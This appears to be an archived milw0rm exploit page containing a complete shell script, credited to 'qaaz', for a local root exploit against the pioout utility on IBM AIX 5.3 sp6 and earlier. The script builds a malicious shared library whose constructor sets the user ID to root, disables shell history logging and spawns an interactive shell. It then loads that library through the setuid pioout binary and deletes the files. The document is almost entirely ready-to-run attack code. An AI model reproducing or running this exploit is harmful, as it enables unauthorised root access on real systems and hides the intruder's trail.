<html><head><title>IBM AIX <= 5.3 sp6 pioout Arbitrary Library Loading Local Root Exploit</title></head><pre>#!/bin/sh
#
# 07/2007: public release
# IBM AIX &lt;= 5.3 sp6
#
echo &quot;-------------------------------&quot;
echo &quot; AIX pioout Local Root Exploit &quot;
echo &quot; By qaaz&quot;
echo &quot;-------------------------------&quot;
cat &gt;piolib.c &lt;&lt;_EOF_
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
void init() __attribute__ ((constructor));
void init()
{
	seteuid(0);
	setuid(0);
	putenv(&quot;HISTFILE=/dev/null&quot;);
	execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-i&quot;, (void *) 0);
	execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-i&quot;, (void *) 0);
	perror(&quot;execl&quot;);
	exit(1);
}
_EOF_
gcc piolib.c -o piolib -shared -fPIC
[ -r piolib ] &amp;&amp; /usr/lpd/pio/etc/pioout -R ./piolib
rm -f piolib.c piolib

# milw0rm.com [2007-07-27]</pre></html>